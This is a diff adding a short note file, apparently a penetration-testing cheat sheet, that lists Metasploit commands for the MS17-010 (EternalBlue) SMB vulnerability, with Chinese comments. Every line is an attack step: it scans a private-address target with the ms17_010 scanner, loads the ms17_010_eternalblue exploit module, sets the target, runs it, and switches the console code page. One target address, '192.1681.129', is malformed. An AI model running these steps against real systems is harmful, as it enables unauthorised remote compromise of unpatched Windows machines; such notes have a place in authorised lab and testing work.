@@ -1,0 +1,10 @@
+ms17-010
+	msfconsole
+	Use auxiliary/scanner/smb/smb_ms17_010				--
+	set RHOSTS 192.168.1.129
+	run
+	use exploit/windows/smb/ms17_010_eternalblue			--使用攻击模块
+	set RHOST 192.1681.129
+	run
+	
+	chcp 65001					--解决乱码问题
